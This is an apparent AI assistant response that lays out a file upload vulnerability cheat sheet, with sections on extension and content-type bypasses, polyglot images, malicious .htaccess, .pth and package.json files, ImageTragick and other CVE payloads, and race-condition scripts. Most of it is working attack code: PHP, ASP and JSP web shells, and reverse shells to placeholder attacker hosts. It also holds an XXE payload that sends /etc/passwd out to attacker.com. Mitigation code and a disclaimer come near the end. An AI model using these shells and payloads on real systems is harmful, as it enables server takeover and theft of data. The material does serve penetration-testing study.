Perfect! Now I'll create a comprehensive file upload vulnerability cheat sheet for you:

---

# 🛡️ **FILE UPLOAD VULNERABILITIES - COMPLETE CHEAT SHEET**

## 📋 **TABLE OF CONTENTS**
1. [Introduction & Impact](#introduction)
2. [Detection Methodology](#detection)
3. [Bypass Techniques](#bypass)
4. [Payloads & Shells](#payloads)
5. [Tools](#tools)
6. [Advanced Techniques](#advanced)
7. [Mitigation](#mitigation)
8. [References](#references)

---

## 1️⃣ **INTRODUCTION** <a name="introduction"></a>

### **What are File Upload Vulnerabilities?**
File upload vulnerabilities occur when a web server allows users to upload files without sufficiently validating:
- File name
- File type (MIME type)
- File contents
- File size

### **Impact** 🔥
- **Remote Code Execution (RCE)** - Upload web shells
- **Denial of Service (DoS)** - Fill disk space
- **Path Traversal** - Overwrite critical files
- **XSS/Client-side attacks** - Upload malicious scripts
- **Information Disclosure** - Read sensitive files

---

## 2️⃣ **DETECTION METHODOLOGY** <a name="detection"></a>

### **Reconnaissance Checklist**
```
✓ Find file upload forms (images, documents, avatars)
✓ Test with normal files first
✓ Intercept requests with Burp Suite
✓ Check response for file path/location
✓ Identify validation mechanisms:
  - Extension checking
  - Content-Type validation  
  - Magic bytes verification
  - File size limits
  - Filename sanitization
```

### **Common Upload Locations**
```
/uploads/
/images/
/avatars/
/files/
/documents/
/temp/
/media/
```

---

## 3️⃣ **BYPASS TECHNIQUES** <a name="bypass"></a>

### **🎯 A. EXTENSION BYPASSES**

#### **1. Double Extensions**
```
file.jpg.php
file.png.php5
file.php.jpg
```

#### **2. Case Sensitivity**
```
file.PHP
file.PhP
file.pHp
file.pHP5
```

#### **3. Alternative PHP Extensions**
```php
.php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
```

#### **4. ASP/IIS Extensions**
```asp
.asp
.aspx
.config
.cer        # IIS <= 7.5
.asa        # IIS <= 7.5
.shtml
.soap
```

#### **5. Null Byte Injection**
```
file.php%00.jpg
file.php\x00.gif
file.php%00.png
file.asp%00.jpg
```

#### **6. Special Characters**

**Multiple dots:**
```
file.php......
file.php....
```

**Whitespace/Newline:**
```
file.php%20
file.php%0d%0a.jpg
file.php%0a
```

**Slashes:**
```
file.php/
file.php.\
file.j\sp
file.j/sp
```

**Right-to-Left Override (RTLO):**
```
name.%E2%80%AEphp.jpg  # Displays as name.gpj.php
```

**UTF-8 Encoding:**
```
Content-Disposition: form-data; name="file"; filename*=UTF8''myfile%0a.txt
```

#### **7. Windows-Specific Tricks**
```
file.php    # Trailing spaces removed on Windows
file.php.   # Trailing dots removed
file.php<   # Special chars converted
file.php>   # > becomes ?
file.php"   # " becomes .
```

---

### **🎯 B. CONTENT-TYPE BYPASSES**

#### **Valid MIME Types for Images**
```http
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: image/jpg
```

#### **Bypass Techniques**
```http
# Set Content-Type twice
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
--boundary
Content-Disposition: form-data; name="upload"
Content-Type: image/png

[real image data]
--boundary--
```

#### **Magic Bytes Injection**
Add image signatures at the beginning:

**PNG:**
```
\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
```

**JPG:**
```
\xff\xd8\xff
```

**GIF:**
```
GIF87a
OR
GIF8;
```

---

### **🎯 C. POLYGLOT FILES**

#### **What are Polyglots?**
Files valid in multiple formats simultaneously [[21]].

#### **Creating Polyglot Images with PHP Code**

**Method 1: Metadata Injection**
```bash
convert -size 110x110 xc:white payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" payload.jpg
```

**Method 2: PNG with PLTE Chunk**
Use `createPNGwithPLTE.php` script to embed PHP in PNG compression chunks

**Method 3: GIF with Global Color Table**
Use `createGIFwithGlobalColorTable.php` to hide PHP in GIF

---

### **🎯 D. CONFIGURATION FILE UPLOADS**

#### **1. Apache .htaccess**
```apache
# Upload as .htaccess
AddType application/x-httpd-php .rce

# Then upload any file with .rce extension
```

**Other .htaccess payloads:**
```apache
# Execute any extension
AddHandler application/x-httpd-php .jpg
php_value auto_append_file "http://attacker.com/shell.txt"

# Disable directory indexing
Options +Indexes
```

#### **2. IIS web.config**
```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="evil" path="*.jpg" verb="*" modules="IsapiModule" 
           scriptProcessor="C:\php\php-cgi.exe" resourceType="Either" requireAccess="Script" />
    </handlers>
  </system.webServer>
</configuration>
```

#### **3. uWSGI uwsgi.ini**
```ini
[uwsgi]
; Read from file
foo = @(sym://uwsgi_funny_function)
; Read from HTTP
test = @(http://attacker.com/payload)
; Execute command
body = @(exec://whoami)
```

#### **4. Python .pth Files**
Drop in `site-packages` or `dist-packages`:
```python
# persistence.pth
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

#### **5. Package.json**
```json
{
  "name": "evil",
  "scripts": {
    "prepare": "/bin/touch /tmp/pwned.txt",
    "postinstall": "bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1"
  }
}
```

---

### **🎯 E. IMAGE TRAGIK (CVE-2016-3714)**

Upload these as image files:

**Payload 1:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

**Payload 2:**
```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

**Trigger:**
```bash
convert shellexec.jpeg whatever.gif
```

---

### **🎯 F. CVE-2022-44268 (ImageMagick LFI)**

**Generate Payload:**
```bash
apt-get install pngcrush imagemagick exiftool exiv2 -y
pngcrush -text a "profile" "/etc/passwd" exploit.png
```

**Trigger:** Upload the file (server processes with ImageMagick)

**Extract:**
```bash
identify -verbose converted.png
python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'
```

---

### **🎯 G. FFMPEG HLS ATTACK**

**Generate Malicious AVI:**
```bash
./gen_xbin_avi.py file:///etc/passwd file_read.avi
```

**Upload** to video processing service

**Server executes:**
```bash
ffmpeg -i file_read.avi output.mp4
```

**Result:** Contents of `/etc/passwd` embedded in output video

---

### **🎯 H. NTFS ALTERNATE DATA STREAMS (ADS)**

**Windows-only technique:**
```
file.asax:.jpg
file.asp::$data.
file.php:.jpg
```

Creates empty file with forbidden extension, editable later via short filename

---

### **🎯 I. RACE CONDITIONS**

**Technique:**
1. Upload malicious file
2. File placed in temp location
3. Validation runs (takes milliseconds)
4. **Race:** Request file BEFORE validation completes
5. Execute shell

**Automation:**
```python
import threading
import requests

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target/upload', files=files)

def execute():
    for i in range(1000):
        try:
            r = requests.get('http://target/uploads/shell.php?cmd=id')
            if r.status_code == 200:
                print(r.text)
                break
        except:
            pass

# Run simultaneously
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=execute)
t1.start()
t2.start()
```

---

## 4️⃣ **PAYLOADS & SHELS** <a name="payloads"></a>

### **🐘 PHP SHELLS**

**Simple Shell:**
```php
<?php system($_GET['cmd']); ?>
```

**Advanced Shell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    exit;
}
?>
```

**Without `<?php` tag:**
```php
<script language="php">system($_GET['cmd']);</script>
```

**Short syntax:**
```php
<?=`$_GET[0]`?>
```

**Base64 encoded:**
```php
<?php eval(base64_decode($_GET['c'])); ?>
```

**File read:**
```php
<?php echo file_get_contents('/path/to/file'); ?>
```

**Reverse shell:**
```php
<?php
$sock=fsockopen("ATTACKER_IP",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

**One-liner reverse shell:**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

---

### **🪟 ASP SHELLS**

**Simple ASP:**
```asp
<%
Set oS = Server.CreateObject("WScript.Shell")
Set oP = oS.Exec("cmd.exe /c " & Request.QueryString("cmd"))
Response.Write oP.StdOut.ReadAll()
%>
```

**ASPX Shell:**
```aspx
<%@ Page Language="C#" %>
<%
System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe");
psi.Arguments = "/c " + Request.QueryString["cmd"];
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

---

### **☕ JSP SHELLS**

```jsp
<%
Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```

---

### **🐍 PYTHON SHELLS**

```python
#!/usr/bin/env python
import os, sys
os.system(sys.argv[1])
```

---

### **💻 OTHER PAYLOADS**

**XSS via SVG:**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.domain)</script>
</svg>
```

**XXE via SVG:**
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

**HTML with XSS:**
```html
<html>
<body>
<script>alert(document.domain)</script>
</body>
</html>
```

---

## 5️⃣ **TOOLS** <a name="tools"></a>

### **Automated Scanners**
```bash
# Fuxploider - File upload scanner
git clone https://github.com/almandin/fuxploider
python3 fuxploider.py -u http://target/upload

# Burp Suite Upload Scanner
# OWASP ZAP FileUpload add-on
```

### **Polyglot Generators**
```bash
# Bulletproof JPG
git clone https://github.com/Dionach/BulletproofJPG
python createBulletproofJPG.py shell.php payload.jpg

# PNG with PHP
php createPNGwithPLTE.php shell.php payload.png

# GIF with PHP  
php createGIFwithGlobalColorTable.php shell.php payload.gif
```

### **Image Manipulation**
```bash
# ExifTool - Edit metadata
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg

# ImageMagick
convert image.jpg payload.jpg

# FFmpeg (for video exploits)
ffmpeg -i input.avi output.mp4
```

### **Wordlists**
```bash
# Extension lists
/usr/share/wordlists/extensions.lst
SecLists/web-all-content-types.txt

# Common upload paths
/uploads/
/images/
/files/
```

---

## 6️⃣ **ADVANCED TECHNIQUES** <a name="advanced"></a>

### **🎯 PATH TRAVERSAL IN UPLOAD**

**Upload with traversal in filename:**
```
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../../../tmp/shell.php"
```

**Bypass filename sanitization:**
```
shell.php/././././
shell.php....
shell.php%20
```

---

### **🎯 CONTENT DISARM & RECONSTRUCTION (CDR) BYPASS**

**Technique:** Embed payload in multiple locations
- Metadata
- Compression chunks
- Color tables
- EXIF data

---

### **🎯 ZIP SLIP**

**Malicious ZIP:**
```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.writestr('../../../../tmp/shell.php', '<?php system($_GET["cmd"]); ?>')
```

---

### **🎯 SVG TO RCE**

**XXE in SVG:**
```svg
<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
%all;
]>
<svg width="100" height="100">
<circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

**evil.dtd:**
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
```

---

### **🎯 MULTIPART FORM-DATA MANIPULATION**

**Double Content-Type:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="legit.jpg"
Content-Type: image/jpeg

[real image data]
------WebKitFormBoundary--
```

---

## 7️⃣ **MITIGATION STRATEGIES** <a name="mitigation"></a>

### **✅ SECURE IMPLEMENTATION CHECKLIST**

#### **1. Extension Validation**
```python
# ✅ DO: Whitelist approach
ALLOWED_EXTENSIONS = {'png', 'jpg', 'gif', 'pdf'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ❌ DON'T: Blacklist approach
```

#### **2. Content-Type Validation**
```python
# Check MIME type but don't trust it alone
allowed_types = ['image/jpeg', 'image/png', 'image/gif']
if file.content_type not in allowed_types:
    raise ValueError("Invalid file type")
```

#### **3. Magic Bytes Verification**
```python
def verify_magic_bytes(file):
    magic_bytes = {
        b'\xFF\xD8\xFF': 'image/jpeg',
        b'\x89PNG\r\n\x1a\n': 'image/png',
        b'GIF87a': 'image/gif',
        b'GIF8;': 'image/gif'
    }
    
    file_start = file.read(8)
    file.seek(0)
    
    for magic, ftype in magic_bytes.items():
        if file_start.startswith(magic):
            return True
    return False
```

#### **4. Filename Sanitization**
```python
import uuid
import os

def secure_filename(filename):
    # Generate random filename
    ext = os.path.splitext(filename)[1].lower()
    return f"{uuid.uuid4().hex}{ext}"

# Remove dangerous characters
filename = re.sub(r'[^\w\-_.]', '', filename)
filename = filename.replace('../', '')
filename = filename.replace('./', '')
```

#### **5. File Size Limits**
```python
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

if len(file.read()) > MAX_FILE_SIZE:
    raise ValueError("File too large")
```

#### **6. Secure Storage**
```python
# ✅ Store outside webroot
upload_path = '/var/uploads/'  # Not /var/www/html/uploads/

# ✅ Use random filenames
filename = secure_filename(original_filename)
filepath = os.path.join(upload_path, filename)

# ✅ Set restrictive permissions
os.chmod(filepath, 0o644)  # Read/write only, no execute
```

#### **7. Image Processing/Re-encoding**
```python
from PIL import Image

def safe_image_upload(file):
    img = Image.open(file)
    img.verify()  # Verify it's an image
    
    # Re-encode to destroy malicious content
    img = Image.open(file)
    output = io.BytesIO()
    img.save(output, format='JPEG')
    return output.getvalue()
```

#### **8. Antivirus Scanning**
```python
import clamd

def scan_file(filepath):
    cd = clamd.ClamdNetworkSocket()
    scan_result = cd.scan(filepath)
    if scan_result['stream'][0] == 'FOUND':
        raise ValueError("Malware detected")
```

#### **9. Content Disarm & Reconstruction (CDR)**
```python
# For PDFs
from pikepdf import Pdf

def sanitize_pdf(input_path, output_path):
    pdf = Pdf.open(input_path)
    pdf.remove_unreferenced_resources()
    pdf.save(output_path)
```

#### **10. Additional Controls**
- **Authentication:** Require login to upload
- **Authorization:** Check user permissions
- **Rate limiting:** Prevent DoS
- **CSRF protection:** Use tokens
- **Logging:** Audit all uploads
- **Quarantine:** Isolate files until validated

---

### **🔒 APACHE CONFIGURATION**

```apache
# Disable script execution in upload directory
<Directory "/var/www/html/uploads">
    Options -ExecCGI
    RemoveHandler .php .phtml .php3 .php4 .php5 .php7
    RemoveType .php .phtml .php3 .php4 .php5 .php7
    php_flag engine off
</Directory>

# Force download instead of execution
<FilesMatch "\.(php|phtml|php3|php4|php5|php7)$">
    ForceType application/octet-stream
</FilesMatch>
```

---

### **🔒 NGINX CONFIGURATION**

```nginx
location /uploads {
    # Disable script execution
    location ~ \.(php|phtml|php3|php4|php5|php7|asp|aspx|jsp)$ {
        deny all;
    }
    
    # Force download
    add_header Content-Disposition attachment;
    
    # Disable CGI
    fastcgi_pass off;
}
```

---

### **🔒 IIS CONFIGURATION (web.config)**

```xml
<configuration>
  <system.webServer>
    <security>
      <requestFiltering>
        <fileExtensions>
          <add fileExtension=".php" allowed="false" />
          <add fileExtension=".phtml" allowed="false" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

---

## 8️⃣ **REFERENCES & RESOURCES** <a name="references"></a>

### **📚 Official Documentation**
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) [[12]]
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) [[15]]
- [PortSwigger File Upload Academy](https://portswigger.net/web-security/file-upload) [[31]]

### **🛠️ Tools & Repositories**
- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) [[30]]
- [Fuxploider - File Upload Scanner](https://github.com/almandin/fuxploider)
- [File Upload Pentest Wiki](https://github.com/Ranveerrrrr/File-Upload-Payloads) [[34]]

### **📰 Recent Research**
- [20 Real-World File Upload Bypass Tricks](https://medium.verylazytech.com/20-real-world-file-upload-bypass-tricks-beyond-php-jpg-step-by-step-guide-for-pentesters-6844504bee3b) [[5]]
- [Polyglot File Attacks](https://www.opswat.com/blog/how-metadefender-prevents-sophisticated-polyglot-image-attacks) [[21]]
- [Advanced File Upload Techniques 2025](https://infosecwriteups.com/100-5000-worth-file-upload-vulnerability-advanced-techniques-7c598837607f) [[3]]

### **🎯 Practice Labs**
- [PortSwigger File Upload Labs](https://portswigger.net/web-security/file-upload)
- [Root Me - File Upload Challenges](https://www.root-me.org)
- [HackTheBox - File Upload Challenges](https://www.hackthebox.com)
- [TryHackMe - File Upload Rooms](https://tryhackme.com)

---

## **📝 QUICK REFERENCE CARD**

### **Common Extensions by Language**
| Language | Extensions |
|----------|-----------|
| **PHP** | .php, .php3, .php4, .php5, .phtml, .phar |
| **ASP** | .asp, .aspx, .asa, .cer, .config |
| **JSP** | .jsp, .jspx, .jsw, .jsv, .jspf |
| **Perl** | .pl, .pm, .cgi, .lib |
| **Python** | .py, .pyc, .pyo, .pth |

### **Magic Bytes**
| Type | Signature |
|------|-----------|
| **JPEG** | FF D8 FF |
| **PNG** | 89 50 4E 47 0D 0A 1A 0A |
| **GIF** | 47 49 46 38 37 61 or 47 49 46 38 39 61 |
| **PDF** | 25 50 44 46 2D |

### **Quick Test Commands**
```bash
# Check file type
file malicious.jpg

# Extract metadata
exiftool image.jpg

# View hex dump
xxd image.jpg | head

# Create test image
convert -size 100x100 xc:white test.jpg
```

---

## **⚠️ ETHICAL DISCLAIMER**

> This cheat sheet is for **educational and authorized security testing purposes only**. Always:
> - Obtain proper written authorization before testing
> - Follow responsible disclosure practices
> - Comply with all applicable laws and regulations
> - Never test systems you don't own or have explicit permission to test

---

**📌 Last Updated:** 2026  
**📌 Version:** 2.0  
**📌 Maintained by:** Eslam Gamal (0xEsso)
